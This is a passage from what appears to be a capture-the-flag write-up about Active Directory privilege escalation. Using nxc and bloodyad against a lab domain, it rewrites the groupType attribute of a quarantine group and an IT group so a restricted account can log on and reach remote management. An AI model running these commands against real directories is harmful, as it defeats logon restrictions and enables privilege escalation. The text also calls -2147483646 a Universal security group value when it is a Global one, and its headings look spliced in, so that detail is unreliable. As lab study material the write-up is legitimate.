# Groups Defanging

**Verifying the account is enabled, but login is still restricted:**

```
nxc smb 10.129.xx.xx -u m.carter -p '[REDACTED]'
```

```
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\m.carter:[REDACTED] STATUS_LOGON_TYPE_NOT_GRANTED
```

This confirms: members of `Identity_Operations` (which `svc_deploy` belongs to) have `WriteProperty` rights specifically over the **groupType** attribute of `Quarantined_Accounts`. `groupType` controls whether a group is a Security group or a Distribution group, and whether it's Global/Domain-Local/Universal — this is exactly the lever needed to defang the quarantine group.

Windows only applies group-based logon-restriction GPOs (and most security-relevant group logic) to **Security** groups — a **Distribution** group is just a mailing/organizational grouping with no security effect. By flipping `groupType` to `2` (Global Distribution Group), `m.carter`'s membership in `Quarantined_Accounts` stops mattering for logon rights:

```powershell
bloodyad -H scaffold.htb -d scaffold.htb -u svc_deploy -p '[REDACTED]' \
  set object 'CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb' groupType -v 2
```

# Case-2 :

6.5 Step 5 — Same `groupType` trick on `IT`, to prep for the remote-management group

The plan requires `m.carter` (via membership in `IT`) to be able to add himself to `Endpoint Remote Management`. First, the DACL on `IT` was checked the same way:

```
[*] ACE[0] info
    ACE Type      : ACCESS_ALLOWED_OBJECT_ACE
    Access mask   : WriteProperty (0x20)
    Object type (GUID) : Group-Type (9a9a021e-4a5b-11d1-a9c3-0000f80367c1)
    Trustee (SID) : Identity_Operations (S-1-5-21-...-1116)
```

Same `Identity_Operations` write access, this time on `IT`'s `groupType`. This group needed the opposite conversion: `IT` needed to become a **Security, Universal** group (`-2147483646`) so that its membership actually confers real, security-relevant group membership (Distribution groups can't be nested inside security-relevant groups like `Endpoint Remote Management` for token/permission purposes):

```
bloodyad -H scaffold.htb -d scaffold.htb -u svc_deploy -p '[REDACTED]' \
  set object 'CN=IT,OU=IT,OU=Scaffold,DC=scaffold,DC=htb' groupType -v -2147483646
```